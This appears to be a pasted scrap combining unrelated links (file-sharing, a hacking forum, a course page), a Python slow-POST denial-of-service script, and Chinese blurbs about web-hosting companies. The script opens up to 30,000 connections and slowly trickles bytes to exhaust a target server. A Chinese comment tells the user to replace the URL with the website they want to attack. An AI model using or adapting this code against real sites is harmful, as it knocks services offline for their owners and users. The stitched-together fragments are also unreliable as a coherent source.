https://drive.google.com/file/d/1dF8K5RzVT6EC9I84LTdp5bCC0vn2LbnG/view

https://edu.csdn.net/course/detail/10750

https://drive.google.com/file/d/1DNRlFUil5O4CEhkUpfnGjXTdr9tOp21r/view?usp=sharing

https://drive.google.com/file/d/1Cnl42jLjVgpyO4PkIFzKWDLwjVy8cVCZ/view?usp=sharing

https://github.com/fluttercandies/wechat_flutter

#!/usr/bin/env python// .ly https://sinister   hz2vAkv#aLfZ   https://hackforums.net/member.php
#https://paper.seebug.org/142/
#https://core.ac.uk/download/pdf/154333223.pdf
import socket
import time
import threading
#Pressure Test,ddos tool
#---------------------------
MAX_CONN=30000
#改写下面的网址为你想攻击的网站！！！！！！！！！
PORT=80
HOST="www..com"
PAGE="/recitewords/api"
#---------------------------
buf=("POST %s HTTP/1.1\r\n"
"Host: %s\r\n"
"Content-Length: 10000\r\n"
"Cookie: dklkt_dos_test\r\n"
"\r\n" % (PAGE,HOST))
socks=[]
def conn_thread():
    global socks
    while len(socks)<MAX_CONN:
        s=socket.socket (socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((HOST,PORT))
            s.send(buf.encode('utf-8'))
            #print ("[+] Send buf OK!,conn=%d\n"%len(socks))
            socks.append(s)
        except Exception as ex:
            print ("[-] Could not connect to server or send error:%s"%ex)
            time.sleep(2)
#end def
def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f".encode('utf-8'))
                #print ("[+] send OK! %s"%s)
            except Exception as ex:
                print ("[-] send Exception:%s\n"%ex)
                socks.remove(s)
                s.close()
                time.sleep(1)
#end def
conn_th=threading.Thread(target=conn_thread,args=())
send_th=threading.Thread(target=send_thread,args=())
conn_th.start()
send_th.start()
while(True):
    print("存活连接数：%d "%len(socks))
    time.sleep(1)
    
    
    
 CertifiedHosting - 成立于1999年，CertifiedHosting提供共享虚拟主机，经销主机托管和独立服务器。
NameCheap - Namecheap成立于2000年，是目前互联网上最大的域名注册商之一。自成立以来，Namecheap提供了许多服务，包括共享主机，经销主机托管，VPS主机和专用服务器。
BitcoinWebHosting - BitcoinWebHosting是专门提供主机服务给比特币社区的美国主机商。

https://clients.hostsailor.com/viewinvoice.php?id=171054
